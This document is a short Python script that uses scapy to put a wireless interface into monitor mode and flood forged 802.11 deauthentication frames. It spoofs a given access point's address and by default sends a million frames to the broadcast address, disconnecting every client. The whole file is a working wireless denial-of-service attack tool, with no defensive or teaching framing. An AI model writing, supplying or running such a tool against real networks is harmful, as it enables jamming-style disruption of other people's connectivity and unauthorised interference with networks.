#!/usr/bin/env python3

import argparse
from scapy.all import *
from os import geteuid
import subprocess

def monitor_mode(interface):
	commands = []
	commands.append(f"sudo ifconfig {interface} down".split())
	commands.append(f"sudo iwconfig {interface} mode monitor ".split())
	commands.append(f"sudo ifconfig {interface} up".split())
	for command in commands:
		a = subprocess.check_output(command , text=False)

def deauth(payload , n , inter , interface):
	sendp(payload , inter=inter , count=n , iface=interface , verbose=1)

def deauth_frames(target , access_point):
	dot11 = Dot11(addr1=target , addr2=access_point , addr3=access_point)
	payload = RadioTap()/dot11/Dot11Deauth(reason=7)
	return payload

if __name__ == "__main__":
	if geteuid() != 0:
		print(" Please Use root and run the script ")
		exit()
	
	parser = argparse.ArgumentParser(description="*** Program to Deauth a mac address ***")
	parser.add_argument("-t" , "--target" , required=False, default="ff:ff:ff:ff:ff:ff" , type=str , help=" target mac address (default=broadcast) ")
	parser.add_argument("-a" , "--ap" , required=True , type=str , help = " access point mac address ")
	parser.add_argument("-c" , "--count" , required=False , type=int , default = 1000000 , help = " Number of packets to send (default = 1000000) ")
	parser.add_argument("--inter" , required=False , type=float , default=0.1 , help = "Interval in sending packets (default = 0.1)")
	parser.add_argument("-i" , "--interface" , required=True , type=str , help = "Interface to send deauth packets")
	args = parser.parse_args()
	
	monitor_mode(args.interface)

	#deauth
	payload = deauth_frames( args.target , args.ap)
	
	print("*** Sending Deauth Packets ***")
	deauth(payload , args.count , args.inter , args.interface)
